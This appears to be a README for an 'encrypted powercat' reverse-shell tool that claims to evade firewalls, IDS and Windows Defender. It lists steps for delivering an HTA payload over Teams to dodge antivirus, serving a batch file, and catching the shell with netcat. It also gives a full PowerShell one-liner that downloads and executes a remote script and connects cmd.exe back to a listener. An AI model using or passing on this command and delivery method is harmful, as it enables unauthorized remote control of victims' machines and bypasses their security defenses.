- Use this to get a reverse shell capable of bypassing Firewalls , IDS systems and Windows Defender ;) , please use within legal frameworks of your country
- deliver hta payload via teams to avoid anti-virus detections
- start a python webserver so payload can grab update.bat file
- start a netcat listner
- use python decoder to decrypt session

![image](https://github.com/zakaria-ahmd20/encrypted-powercat/assets/94662829/4b6074fa-d89f-40f8-be95-0c52a2c31421)
^
![image](https://github.com/zakaria-ahmd20/encrypted-powercat/assets/94662829/57e9823a-99d7-4c8a-afab-e55c72aff149)
pwsh -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zakaria-ahmd20/encrypted-powercat/main/powercat.ps1'); powercat -c 192.168.15.195 -p 443 -e cmd.exe -ge > update.bat"
